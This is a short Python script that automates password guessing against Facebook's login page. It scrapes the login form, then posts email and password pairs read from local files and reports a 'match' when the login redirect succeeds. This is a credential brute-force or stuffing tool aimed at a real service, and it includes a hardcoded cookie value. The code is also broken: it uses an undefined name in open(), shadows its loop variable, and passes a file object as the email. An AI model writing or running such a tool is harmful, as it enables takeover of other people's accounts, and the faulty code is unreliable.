import requests
from bs4 import BeautifulSoup


POST_URL = 'https://www.facebook.com/login.php'
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'
}

PAYLOAD = {}
COOKIES = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
EMAIL = open('email.txt', r)
PASS = open('pass.txt', r)
emails = []
passwords = []
deleted_item = ['email', 'pass', 'prefill_contact_point', 'prefill_source', 'prefill_type', 'first_prefill_source', 'first_prefill_type', 'had_cp_prefilled', 'had_password_prefilled', 'ab_test_data']

for i in EMAIL:
    emails.append(i)
    
for j in PASS:
    passwords.append(j)
    
 
def create_form():
    data = requests.get(POST_URL, headers=HEADERS)
    for i in data.cookies:
        COOKIES[i.name] = i.value
    Data = BeautifulSoup(data.text, 'html.parser').form
    for i in Data.find_all('input'):
        PAYLOAD[i.get('name')] = i.get('value')
    for j in deleted_item:
        del PAYLOAD[j]



        
def is_this_a_password(email, password):
    PAYLOAD['email'] = email
    PAYLOAD['pass'] = password
    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
    print(r.url)
    if r.url == "https://www.facebook.com/":
        print('\nWe got a match! Password is : ', password)
    else:
        print('we have nothing')


if __name__ == "__main__":
    create_form()
    for i in emails:
        for i in passwords:
            is_this_a_password(EMAIL, i)


    
